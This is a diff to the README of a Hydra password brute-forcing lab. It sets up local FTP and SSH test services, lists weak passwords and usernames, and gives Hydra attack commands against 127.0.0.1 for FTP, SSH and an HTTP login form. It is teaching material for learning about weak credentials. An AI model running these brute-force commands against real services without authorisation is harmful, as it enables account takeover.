@@ -30,55 +30,45 @@ This lab demonstrates how attackers exploit weak password configurations through
 
 ### 🔧 A. Install Hydra
 
-
+```bash
 sudo apt update
-
 sudo apt install hydra -y
-
+```
 
 ### 📡 B. Setup Target Services
 
 #### FTP Server (vsftpd)
 
-
+```bash
 sudo apt install vsftpd -y
-
 sudo useradd -m testuser
-
 sudo passwd test
-
 sudo nano /etc/vsftpd.conf
-
+```
 
 Ensure the following settings:
 
-
+```
 local_enable=YES
-
 write_enable=YES
-
 chroot_local_user=YES
-
 allow_writeable_chroot=YES
-
 anonymous_enable=NO
-
+```
 
 Then restart:
 
-
+```bash
 sudo systemctl restart vsftpd
-
+```
 
 #### SSH Server
 
-
+```bash
 sudo apt install openssh-server -y
-
 sudo systemctl start ssh
-
 sudo systemctl enable ssh
-
+```
 
 ---
 
@@ -86,25 +76,20 @@ sudo systemctl enable ssh
 
 ### 🔑 Password List `passwords.txt`
 
-
+```
 123456
-
 password
-
 admin
-
 test
-
+```
 
 ### 👤 User List `users.txt`
 
-
+```
 testuser
-
 admin
-
 root
-
+```
 
 ---
 
@@ -112,21 +97,21 @@ root
 
 ### 🧬 FTP Login
 
-
+```bash
 hydra -l testuser -P passwords.txt ftp://127.0.0.1
-
+```
 
 ### 🛡 SSH Login
 
-
+```bash
 hydra -l testuser -P passwords.txt ssh://127.0.0.1
-
+```
 
 ### 🌐 HTTP Login (POST form)
 
-
+```bash
 hydra -l testuser -P passwords.txt 127.0.0.1 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
-
+```
 
 Replace `/login`, `username`, `password`, and `incorrect` using browser dev tools or Burp Suite to match the form.
 
@@ -156,6 +141,7 @@ This lab illustrates how weak credentials are easily exploited. Brute-force test
 ---
 
 
+
 ## 🏷 Badges
 
 ![Hydra](https://img.shields.io/badge/Tool-Hydra-blue)
@@ -164,4 +150,5 @@ This lab illustrates how weak credentials are easily exploited. Brute-force test
 ![Brute Force](https://img.shields.io/badge/Technique-Brute_Force-orange)
 
 ---
+
 
